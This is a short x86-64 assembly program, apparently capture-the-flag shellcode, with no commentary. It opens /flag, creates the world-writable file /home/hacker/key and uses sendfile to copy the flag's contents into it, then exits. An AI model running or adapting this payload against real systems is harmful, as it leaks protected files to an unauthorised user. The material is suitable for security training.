.global _start
_start:
.intel_syntax noprefix
        lea eax, [eip + m]
        mov edi, eax
        mov esi, 0
        mov edx, 0
        mov eax, 2
        syscall
        mov ebx, eax

        lea eax, [eip + o]
        mov edi, eax
        mov esi, 65
        mov edx, 511
        mov eax, 2
        syscall

        mov edi, eax
        mov esi, ebx
        mov eax, 40
        mov edx, 0
        mov r10, 0x100
        syscall

        mov eax, 3
        syscall

        mov eax, 60
        mov edi, 0
        syscall
m:
        .string "/flag"
o:
        .string "/home/hacker/key"